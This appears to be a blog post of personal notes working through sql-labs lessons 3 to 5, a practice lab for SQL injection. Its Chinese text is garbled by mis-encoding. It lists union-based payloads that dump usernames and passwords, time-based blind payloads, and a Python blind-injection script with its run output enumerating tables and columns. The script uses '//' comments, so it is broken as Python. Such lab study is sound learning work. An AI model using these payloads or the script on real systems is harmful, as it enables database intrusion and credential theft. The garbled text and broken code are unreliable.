<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å¦‚æ­¤ä¸€æ¥æˆåŠŸé—­åˆsqlæŸ¥è¯¢ï¼Œåé¢å°±æŒ‰æµç¨‹èµ°okäº†<br><br><span class="hljs-section">## æ–°çŸ¥è¯†ç‚¹</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*å¹¶å’Œæ‹¬å·*</span>**</span>  <br></code></pre></td></tr></table></figure>
<p>select * from users where id&#x3D;(â€˜$idâ€™)</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><br><span class="hljs-meta"># sql-labs less-4</span><br><br>ä¸€å¼€å§‹ä¹Ÿä¸çŸ¥é“æœ‰ç”¨åŒå¼•å·æ¥æ„é€ çš„ï¼Œç„¶åè¿˜æ˜¯çœ‹äº†csdnğŸ˜…<br><br>ä¼ å…¥ï¼š<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1â€)</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">å›æ˜¾ï¼š<br><br>&gt; You have <span class="hljs-keyword">an</span> error <span class="hljs-keyword">in</span> your SQL syntax; check <span class="hljs-keyword">the</span> manual that corresponds <span class="hljs-built_in">to</span> your MySQL server <span class="hljs-built_in">version</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> syntax <span class="hljs-built_in">to</span> use near <span class="hljs-string">&#x27;&quot;) LIMIT 0,1&#x27;</span> <span class="hljs-keyword">at</span> <span class="hljs-built_in">line</span> <span class="hljs-number">1</span> <br><br>  <br>æ¨æµ‹åå°sqlè¯­å¥ï¼š<br></code></pre></td></tr></table></figure>
<p>select * from users where id&#x3D;(â€œ$idâ€)</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">  <br>åé¢çš„paylaodï¼š<br><br></code></pre></td></tr></table></figure>
<p>?id&#x3D;-1â€) union select 1,2,3 â€“+<br>?id&#x3D;-1â€) union select 1,database(),3 â€“+<br>?id&#x3D;-1â€) union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;â€™securityâ€™â€“+<br>?id&#x3D;-1â€) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name&#x3D;â€™usersâ€™â€“+<br>?id&#x3D;-1â€) union select 1,database(),group_concat(id,username,password) from usersâ€“+</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># æ–°çŸ¥è¯†ç‚¹</span></span><br>***åŒå¼•å·***  <br><br>ç”¨åŒå¼•å·æ¥ &quot; æ¥é—­åˆè¯­å¥<br><br><br><br><br>---<br>title: note-03<br>date: 2025-02-28 20:48:34<br>tags: sql-labs<br>---<br>&lt;style&gt;<br>pre &#123;<br>  overflow-y: auto;<br>  max-height: 300px;<br>&#125;<br>&lt;/style&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">sql-labs less5</span><br>è¾“å…¥payload  <br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">?<span class="hljs-built_in">id</span>=1</span>  <br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">?<span class="hljs-built_in">id</span>=2</span><br><br>å›æ˜¾<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">You are <span class="hljs-keyword">in</span>...........</span>  <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">You are <span class="hljs-keyword">in</span>...........</span>  <br>  <br>è§†ä¹æ˜¯æ²¡æœ‰å›æ˜¾ã€‚æ ¹æ®ä»¥å‰ä¸€ç‚¹ç‚¹ctfçš„ç»éªŒï¼Œåº”è¯¥æ˜¯å¸ƒå°”ç›²æ³¨äº†ï¼Œæ²¡æƒ³åˆ°ç¬¬äº”é¢˜å°±é‡ä¸Šäº†ã€‚  <br><br>å°è¯•æ„å»ºsqlæ³¨å…¥çš„paylaod  <br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;</span></span>  <br><br>å›æ˜¾<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash"><span class="hljs-string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27; LIMIT 0,1&#x27;</span> at line 1</span>    <br><br>æ¨æµ‹åç«¯è¯­å¥å¯èƒ½ä¸º  <br></code></pre></td></tr></table></figure>
<p>select * from users where id&#x3D;â€™$get_idâ€™</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>ç„¶åçœ‹csdn<br><br>çœ‹åˆ°ä¸¤ç§è§£æ³•ï¼Œç»å…¸çš„æ˜¯åŸºäºæ—¶é—´çš„å¸ƒå°”ç›²æ³¨ï¼Œæ–°çš„æ˜¯åŸºäº<span class="hljs-type">xml</span>æŠ¥é”™å›æ˜¾çš„æ³¨å…¥<br><br>##  å¸ƒå°”ç›²æ³¨<br>åŸç†æ˜¯ç”¨<span class="hljs-keyword">sql</span>ä¸­çš„  <br><br>&gt;<span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>  <br><br>è¿”å›çš„å¸ƒå°”å€¼ï¼ˆ<span class="hljs-keyword">true</span>,<span class="hljs-keyword">false</span>ï¼‰ç„¶åç”¨<span class="hljs-keyword">if</span>()è®¾ç½®ä¸åŒçš„ååº”ï¼Œæ ¹æ®ååº”æ¥åˆ¤æ–­å¸ƒå°”çš„å€¼æ¥åˆ¤æ–­æ³¨å…¥æŸ¥è¯¢çš„æ•°æ®æ˜¯å¦å­˜åœ¨å§<br></code></pre></td></tr></table></figure>
<p>lengthå‡½æ•°ç”¨æ³•<br>åç«¯è¯­å¥ï¼š<br>select length()ï¼› â€“ è¿”å›lengthé‡Œçš„å­—èŠ‚æˆ–å­—ç¬¦é•¿åº¦</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">length</span>å‡½æ•°ï¼š<br><br>KIMIï¼š  <br></code></pre></td></tr></table></figure>
<p>MySQLï¼šLENGTH è¿”å›å­—èŠ‚é•¿åº¦ï¼ŒCHAR_LENGTH è¿”å›å­—ç¬¦é•¿åº¦ã€‚<br>PostgreSQLï¼šLENGTH è¿”å›å­—ç¬¦é•¿åº¦ã€‚<br>SQLiteï¼šLENGTH è¿”å›å­—èŠ‚é•¿åº¦ã€‚<br>SQL Serverï¼šLEN è¿”å›å­—ç¬¦é•¿åº¦ã€‚<br>Oracleï¼šLENGTH è¿”å›å­—èŠ‚é•¿åº¦ï¼ŒLENGTHC è¿”å›å­—ç¬¦é•¿åº¦ã€‚</p>
<p>PostgreSQL&#x2F;SQLite&#x2F;Oracleï¼šä½¿ç”¨ CASE è¯­å¥ã€‚</p>
<p>SQL Serverï¼šä½¿ç”¨ CASE è¯­å¥æˆ– IFâ€¦ELSE è¯­å¥ã€‚</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>sqlä¸­<span class="hljs-built_in">if</span>()è¯­å¥çš„ç”¨æ³•ï¼š  <br><br>KIMIï¼š  <br><br></code></pre></td></tr></table></figure>
<p>MySQLï¼šIF(expr, true_expr, false_expr)<br>SELECT IF(1 &gt; 0, â€˜Trueâ€™, â€˜Falseâ€™); â€“ è¿”å› â€˜Trueâ€™<br>SELECT IF(1 &lt; 0, â€˜Trueâ€™, â€˜Falseâ€™); â€“ è¿”å› â€˜Falseâ€™</p>
<p>PostgreSQL&#x2F;SQLite&#x2F;Oracleï¼šä½¿ç”¨ CASE è¯­å¥ã€‚</p>
<p>SQL Serverï¼šä½¿ç”¨ CASE è¯­å¥æˆ– IFâ€¦ELSE è¯­å¥ã€‚  </p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lasso">  <br>çœ‹csdnä¸Šï¼Œå¯ä»¥ç”¨lengthæ ¹æ®æ˜¯å¦æœ‰You are <span class="hljs-keyword">in</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..æ¥åˆ¤æ–­ï¼›  <br><br>ä¹Ÿèƒ½ç”¨<span class="hljs-literal">and</span> <span class="hljs-keyword">if</span> sleepçš„æ—¶é—´å»¶è¿Ÿæ¥åˆ¤æ–­ï¼›<br><br>æ ¹æ®å‰å‡ é¢˜å¤§æ¦‚çŸ¥é“æ•°æ®åº“åç§°ä¸º<span class="hljs-string">&#x27;security&#x27;</span>ä¸º<span class="hljs-number">8</span>ä¸ªå­—ç¬¦ï¼›  <br><br>payloadï¼š<br><br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1â€™ and if(length(database())&#x3D;8,sleep(5),1)â€“+  </p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><br>payloadçš„é€»è¾‘æ˜¯å…ˆç”¨<span class="hljs-keyword">length</span>åˆ¤æ–­å½“å‰æ‰€åœ¨æ•°æ®åº“çš„åå­—é•¿åº¦ï¼Œ<br>&gt;å¦‚æœçŒœå¯¹ä¸º<span class="hljs-number">8</span>ï¼Œåˆ™è®©å›æ˜¾å»¶è¿Ÿ<span class="hljs-number">5</span>ç§’ï¼Œæ­¤æ—¶å› ä¸ºä½¿ç”¨äº†<span class="hljs-keyword">and</span>ï¼Œ<span class="hljs-keyword">and</span>çš„å³è¾¹æ— æ³•æ»¡è¶³å¸ƒå°”å€¼ä¸ºçœŸï¼Œæ‰€ä»¥ä¸ä¼šæœ‰å›æ˜¾<br>ä»€ä¹ˆä¹Ÿæ²¡æœ‰å›æ˜¾ï¼Œè¯´æ˜çŒœæµ‹å­—ç¬¦é•¿åº¦æ­£ç¡®ï¼›<br><br>&gt;å¦‚æœçŒœæµ‹é”™è¯¯ï¼Œåˆ™ä¼šä½¿å¾—<span class="hljs-keyword">if</span>è¿”å›<span class="hljs-number">1</span>ï¼Œè®©<span class="hljs-keyword">and</span>çš„ä¸¤è¾¹æ»¡è¶³å…¨ä¸ºçœŸï¼Œä½¿å¾—æœåŠ¡å™¨è¿”å›â€˜you are in......â€™<br><br>å…¶ä¸­ç”¨åˆ°äº†<span class="hljs-keyword">if</span>å‡½æ•°å’Œ<span class="hljs-keyword">sleep</span>å‡½æ•°,  <br><span class="hljs-keyword">sleep</span>()å‡½æ•°æ˜¯è®©å›æ˜¾å»¶è¿ŸæŒ‡å®šçš„æ—¶é—´å§ï¼›  <br><br>å›åˆ°payload<br><br>æŒ‰ç…§æˆ‘ä»¬è®¾ç½®çš„å»¶è¿Ÿå¯ç¡®è®¤ç¡®å®ä¸º<span class="hljs-number">8</span>ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯<span class="hljs-string">&#x27;security&#x27;</span><br><br>è¯•äº†ä¸€ä¸‹<br><br>id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(length(database())=&#x27;</span>security<span class="hljs-string">&#x27;,sleep(5),1)--+id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">length</span>(database())=<span class="hljs-string">&#x27;security&#x27;</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><br>é—®äº†kimiï¼ŒåŸæ¥æ˜¯<span class="hljs-keyword">length</span>()å‡½æ•°åªä¼šè¿”å›æ•´å‹æ•°å€¼ï¼Œè€Œæˆ‘è¦ç”¨å®ƒæ¥å¯¹æ¯”å­—ç¬¦ä¸²ğŸ˜…  <br><br>**ç„¶åæ˜¯<span class="hljs-keyword">substr</span>()å‡½æ•°**  <br><br></code></pre></td></tr></table></figure>
<p>SUBSTR(string, start, length)</p>
<p>stringï¼šåŸå§‹å­—ç¬¦ä¸²ã€‚<br>startï¼šå­å­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®ï¼ˆä» 1 å¼€å§‹è®¡æ•°ï¼‰ã€‚<br>lengthï¼šè¦æå–çš„å­å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br><span class="hljs-function"><span class="hljs-title">ascii</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure>
<p>ASCII(character_expression)</p>
<p>character_expressionï¼šå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ã€å­—ç¬¦ä¸²å­—é¢å€¼æˆ–åˆ—åã€‚è¯¥å‚æ•°å¿…é¡»æ˜¯å­—ç¬¦ç±»å‹ï¼ˆå¦‚ CHAR æˆ– VARCHARï¼‰ã€‚</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">ä¸€å®šè¦è½¬æˆ<span class="hljs-keyword">ascii</span>å—ï¼Ÿ  <br>è¯•äº†ä¸€ä¸‹<br><br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1â€™ and if(substr(database(),1,1)&#x3D;â€™sâ€™,sleep(5),1)â€“+</p>
<p>?id&#x3D;1â€™ and if(substr(database(),1,8)&#x3D;â€™securityâ€™,sleep(5),1)â€“+</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso">ç¡®å®èƒ½ç›´æ¥çŒœæµ‹å­—ç¬¦äº†!<br><br>å¦‚æœæœ‰pythonè„šæœ¬çš„è¯<span class="hljs-params">...</span><span class="hljs-params">...</span>  <br>kï¼šæœ‰çš„å…„å¼Ÿï¼Œæœ‰çš„<br><br>KIMIï¼š  <br><br></code></pre></td></tr></table></figure>
<p>import requests<br>&#x2F;&#x2F;é…ç½®<br>TARGET_URL &#x3D; â€œ<a target="_blank" rel="noopener" href="http://localhost:32768/Less-5/">http://localhost:32768/Less-5/</a>â€œ  &#x2F;&#x2F; ç›®æ ‡URL<br>TRUE_STRING &#x3D; â€œYou are inâ€¦â€¦â€¦..â€  &#x2F;&#x2F; æ•°æ®åº“åˆ¤æ–­æˆåŠŸçš„å“åº”æ ‡å¿—<br>CHARSET &#x3D; â€œabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!â€  &#x2F;&#x2F; æµ‹è¯•å­—ç¬¦é›†<br>HEADERS &#x3D; {<br>    â€œUser-Agentâ€: â€œMozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;58.0.3029.110 Safari&#x2F;537.3â€<br>}</p>
<p>&#x2F;&#x2F;å‘é€è¯·æ±‚<br>def send_payload(payload):<br>    url &#x3D; fâ€{TARGET_URL}?id&#x3D;1â€™ AND {payload} â€“+â€<br>    response &#x3D; requests.get(url, headers&#x3D;HEADERS)<br>    return response.text<br>&#x2F;&#x2F; è·å–é•¿åº¦<br>def get_length(query):<br>    length &#x3D; 0<br>    while True:<br>        payload &#x3D; fâ€LENGTH({query})&#x3D;{length}â€<br>        response &#x3D; send_payload(payload)<br>        if TRUE_STRING in response:<br>            print(fâ€[+] é•¿åº¦ä¸º: {length}â€)<br>            return length<br>        length +&#x3D; 1<br>&#x2F;&#x2F; é€å­—ç¬¦è·å–å­—ç¬¦ä¸²<br>def get_string(query, length):<br>    result &#x3D; â€œâ€<br>    for i in range(1, length + 1):<br>        print(fâ€[+] è·å–ç¬¬ {i} ä¸ªå­—ç¬¦â€¦â€)<br>        for char in CHARSET:<br>            payload &#x3D; fâ€SUBSTR({query},{i},1)&#x3D;â€™{char}â€™â€<br>            response &#x3D; send_payload(payload)<br>            if TRUE_STRING in response:<br>                result +&#x3D; char<br>                print(fâ€[+] å½“å‰ç»“æœ: {result}â€)<br>                break<br>    return result</p>
<p>&#x2F;&#x2F; ä¸»å‡½æ•°<br>def main():<br>    &#x2F;&#x2F; è·å–æ•°æ®åº“å<br>    db_length &#x3D; get_length(â€œDATABASE()â€)<br>    db_name &#x3D; get_string(â€œDATABASE()â€, db_length)<br>    print(fâ€[+] æ•°æ®åº“å: {db_name}â€)</p>
<pre><code class="hljs">// è·å–è¡¨å
table_count = 0
while True:
    payload = f&quot;(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=&#123;table_count&#125;&quot;
    response = send_payload(payload)
    if TRUE_STRING in response:
        break
    table_count += 1
print(f&quot;[+] è¡¨æ•°é‡: &#123;table_count&#125;&quot;)

// è·å–æ‰€æœ‰è¡¨å
table_names = []
for i in range(table_count):
    tbl_length = get_length(f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT &#123;i&#125;,1)&quot;)
    tbl_name = get_string(f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT &#123;i&#125;,1)&quot;, tbl_length)
    table_names.append(tbl_name)
    print(f&quot;[+] è¡¨å: &#123;tbl_name&#125;&quot;)

// è·å–å­—æ®µåï¼ˆä»¥usersè¡¨ä¸ºä¾‹ï¼‰
target_table = &quot;users&quot;  // æ›¿æ¢ä¸ºç›®æ ‡è¡¨å
print(f&quot;[+] è·å–&#123;target_table&#125;è¡¨çš„å­—æ®µ...&quot;)
field_count = 0
while True:
    payload = f&quot;(SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#39;&#123;target_table&#125;&#39; AND table_schema=DATABASE())=&#123;field_count&#125;&quot;
    response = send_payload(payload)
    if TRUE_STRING in response:
        break
    field_count += 1
print(f&quot;[+] å­—æ®µæ•°é‡: &#123;field_count&#125;&quot;)

// è·å–å­—æ®µå
field_names = []
for i in range(field_count):
    fld_length = get_length(f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#39;&#123;target_table&#125;&#39; AND table_schema=DATABASE() LIMIT &#123;i&#125;,1)&quot;)
    fld_name = get_string(f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#39;&#123;target_table&#125;&#39; AND table_schema=DATABASE() LIMIT &#123;i&#125;,1)&quot;, fld_length)
    field_names.append(fld_name)
    print(f&quot;[+] å­—æ®µå: &#123;fld_name&#125;&quot;)

// è·å–æ•°æ®
print(f&quot;[+] è·å–&#123;target_table&#125;è¡¨çš„æ•°æ®...&quot;)
for i in range(field_count):
    if field_names[i] in [&quot;username&quot;, &quot;password&quot;]:  // è·å–ç”¨æˆ·åå’Œå¯†ç å­—æ®µ
        print(f&quot;[+] è·å–å­—æ®µ: &#123;field_names[i]&#125;&quot;)
        data_count = 0
        while True:
            payload = f&quot;(SELECT COUNT(*) FROM &#123;target_table&#125;)=&#123;data_count&#125;&quot;
            response = send_payload(payload)
            if TRUE_STRING in response:
                break
            data_count += 1
        print(f&quot;[+] æ•°æ®æ¡æ•°: &#123;data_count&#125;&quot;)

        for j in range(data_count):
            data_length = get_length(f&quot;(SELECT &#123;field_names[i]&#125; FROM &#123;target_table&#125; LIMIT &#123;j&#125;,1)&quot;)
            data = get_string(f&quot;(SELECT &#123;field_names[i]&#125; FROM &#123;target_table&#125; LIMIT &#123;j&#125;,1)&quot;, data_length)
            print(f&quot;[+] æ•°æ®[&#123;j+1&#125;]: &#123;data&#125;&quot;)
</code></pre>
<p>if <strong>name</strong> &#x3D;&#x3D; â€œ<strong>main</strong>â€œ:<br>    main()</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos"><br>è¿™æ˜¯ç›´æ¥çŒœæµ‹å­—ç¬¦è€Œä¸çŒœæµ‹å…¶<span class="hljs-keyword">ascii</span>ç çš„    <br>æ”¹äº†ä¸€ä¸‹  <br></code></pre></td></tr></table></figure>
<p>sr &#x3D; string.printable<br>CHARSET &#x3D; sr  &#x2F;&#x2F;â€œabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!â€  &#x2F;&#x2F; æµ‹è¯•å­—ç¬¦é›†</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">å› ä¸ºæˆ‘ä¹Ÿä¸æ•¢ç¡®å®šaiç»™å‡ºçš„å­—ç¬¦æ˜¯å®Œæ•´ä¸”ç¼–ç æ­£ç¡®çš„  <br><br>æ•æˆ‘åªæ˜¯ä¸ªè„šæœ¬å°å­ï¼Œèƒ½å­¦æ‡‚åŸç†å…ˆå§  <br><br>è¿è¡Œç»“æœ<br></code></pre></td></tr></table></figure>
<p>[+] é•¿åº¦ä¸º: 8<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: s<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: se<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: sec<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: secu<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: secur<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: securi<br>[+] è·å–ç¬¬ 7 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: securit<br>[+] è·å–ç¬¬ 8 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: security<br>[+] æ•°æ®åº“å: security<br>[+] è¡¨æ•°é‡: 4<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: e<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: em<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ema<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: emai<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: email<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: emails<br>[+] è¡¨å: emails<br>[+] é•¿åº¦ä¸º: 8<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: r<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: re<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ref<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: refe<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: refer<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: refere<br>[+] è·å–ç¬¬ 7 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: referer<br>[+] è·å–ç¬¬ 8 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: referers<br>[+] è¡¨å: referers<br>[+] é•¿åº¦ä¸º: 7<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: u<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ua<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: uag<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: uage<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: uagen<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: uagent<br>[+] è·å–ç¬¬ 7 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: uagents<br>[+] è¡¨å: uagents<br>[+] é•¿åº¦ä¸º: 5<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: u<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: us<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: use<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: user<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: users<br>[+] è¡¨å: users<br>[+] è·å–usersè¡¨çš„å­—æ®µâ€¦<br>[+] å­—æ®µæ•°é‡: 3<br>[+] é•¿åº¦ä¸º: 2<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: i<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: id<br>[+] å­—æ®µå: id<br>[+] é•¿åº¦ä¸º: 8<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: u<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: us<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: use<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: user<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: usern<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: userna<br>[+] è·å–ç¬¬ 7 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: usernam<br>[+] è·å–ç¬¬ 8 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: username<br>[+] å­—æ®µå: username<br>[+] é•¿åº¦ä¸º: 8<br>[+] è·å–ç¬¬ 1 